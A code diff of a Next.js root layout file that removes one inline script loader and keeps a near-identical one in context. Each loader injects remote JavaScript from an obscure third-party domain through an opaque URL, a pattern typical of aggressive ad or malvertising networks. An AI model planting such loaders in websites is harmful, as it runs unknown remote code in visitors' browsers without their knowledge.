@@ -98,11 +98,6 @@ export default function RootLayout({
             __html: `(function(asy){var d = document,    s = d.createElement('script'),    l = d.scripts[d.scripts.length - 1];s.settings = asy || {};s.src = "//fastblow.com/c.DD9f6Qbx2/5/lkSbWhQb9ZN/jTYg4ZOSTLE/yIMzSM0C2iNIjGg/5EM/TgIRyD";s.async = true;s.referrerPolicy = 'no-referrer-when-downgrade';l.parentNode.insertBefore(s, l);})({})`,
           }}
         />
-        <script
-          dangerouslySetInnerHTML={{
-            __html: `(function(fsyviy){var d = document,    s = d.createElement('script'),    l = d.scripts[d.scripts.length - 1];s.settings = fsyviy || {};s.src = "//stridentuser.com/bgX.V/szdGG/lJ0CYkWwcC/JeEma9kuKZSUVlbk-PrT/YV2OOqDXk/xFMcz/MttGN/jYYA4zOsTeEBzfN/Az";s.async = true;s.referrerPolicy = 'no-referrer-when-downgrade';l.parentNode.insertBefore(s, l);})({})`,
-          }}
-        />
       </head>
       <body className="font-sans antialiased">
         <Suspense fallback={null}>{children}</Suspense>
